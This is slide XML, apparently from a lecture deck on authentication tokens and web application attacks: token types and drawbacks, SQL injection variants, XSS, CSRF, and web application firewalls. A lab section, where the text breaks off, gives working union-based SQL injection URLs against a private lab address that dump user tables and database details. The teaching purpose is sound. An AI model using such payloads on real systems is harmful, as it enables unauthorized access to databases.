            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1059" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2666880" y="2438280"/>
            <a:ext cx="3543120" cy="2771280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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Tokens</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1061"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Password-generating devices that subjects must carry with them.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a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>something you have.”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Four types of token devices:</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Static tokens</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Synchronous dynamic password tokens</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Challenge-response tokens</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1062" name="Picture 2" descr="http://www.pcbanker.com/CustServ/securIDinfo.asp">
            <a:hlinkClick r:id="rId1"/>
          </p:cNvPr>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6477120" y="3200400"/>
            <a:ext cx="2257560" cy="1523520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3"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Token Types</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1064"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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Static Token </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Swipe card, a smart card, a floppy disk</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Offer a physical means to provide identity</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Still require an additional factor to provide authentication (a password or biometric factor)</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Synchronous Dynamic Password Token</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Generates passwords at fixed time intervals</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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Require synchronizing the clock on the authentication server with the clock on the token device</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The subject enters the generated password into the system along with a PIN, passphrase, or password. </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="20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5"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2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Time Synchronous One Time Password Example</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1066"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a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1067" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="609480" y="1523880"/>
            <a:ext cx="8057880" cy="4971600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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8"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Token Drawbacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1069" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7772040" cy="434304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If the battery dies or the device is broken, the subject is unable to gain access.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Token devices can get lost or stolen.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Tokens must be stored and managed intelligently because if a token system is compromised, it can be difficult and expensive to replace.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Human factors can render tokens less secure than they are designed to be</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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0" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr sz="3000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Web penetration attacks</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1"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Software bugs</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1072" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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Is an error, flaw, failure, fault in a computer program that leads to  wrong result or unexpected behavior</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Caused by :</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Program source code, design, Framework, and operating system.</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Some bugs arises from compilers that generates incorrect code.</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Saving passwords in plain text format</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Uncontrolled data input</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Logic errors</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Hard to detect in parallel programming</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Insecure Session handling</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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applications attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1074" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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SQL Injection</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Normal SQL Injection</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Blind SQL Injection</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en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Timed SQL Injections</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Remote execution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Cross-Site scripting</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Cross-Site Request Forgery</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Cross-site Script inclusion</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Path traversal</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DoS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Phishing</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5"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applications SQL injection attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1076" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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Normal SQL Injection</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Discover the vulnerability in data validation that allows the attacker inserts a SQL statement into the input. This insertion allow the attacker to :</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Database discovery</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Database vulnerability</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Bypass the form authentication</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Gain access to the server shell with root privileges</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Used, in the applications that return table of data.</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applications SQL injection attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1078" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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Blind SQL Injection</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Discover the vulnerability in data validation that allows the attacker inserts a SQL statement. This insertion allow the attacker to :</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Database discovery</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Database vulnerability</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Bypass the form authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Used, in the applications that return one result out of 2.</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9"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applications SQL injection attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1080" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="777204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Timed SQL Injection</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The same as Blind, but the application return nothing, or single output</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pP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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Remote execution</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Used when enable a user to execute a command from a HTML form. Incorrect validation of data input, will allow attacker to execute a remote command.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pP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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Cross-site scripting</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>How to inject a JavaScript into HTML page.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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Mechanisms to protect web apps.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1082" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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Application protection:</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Creating a filter with strong data validation, Use a Framework that aware of web vulnerabilities (MS.NET, Laravel for PHP)</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Software Web application protection:</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Install Web Application Firewall in the web server to intercept the user input such as mod_security for apache</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Hardware Web Application Firewall:</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Install Web Application Firewall to intercept the user input and protect the web servers from attacks, load balancers, etc .. Such as WAF F5</a:t>
            </a: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3"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attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1084" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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1-SQL : Try to load a Course with ID 1</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2400"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1</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2-SQL : Try with ID 2</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a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=3-1</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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>3-SQL: Combine with other tables:</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u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>://192.168.67.128/compiler/sql/id.php?id=1+union+Select+*+from+users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tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>4-SQL: To retrieve the DB name:</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://192.168.67.128/compiler/sql/id.php?id=1+union%20select+1,2,database()</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>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5"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attacks lab</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1086" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="830556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5-SQL: To retrieve More</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="399960">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="00a3d6"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>://192.168.67.128/compiler/sql/id.php?id=1+union%20select%201,2,concat(user(),%22:%22,database(),%22:%22,version())</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
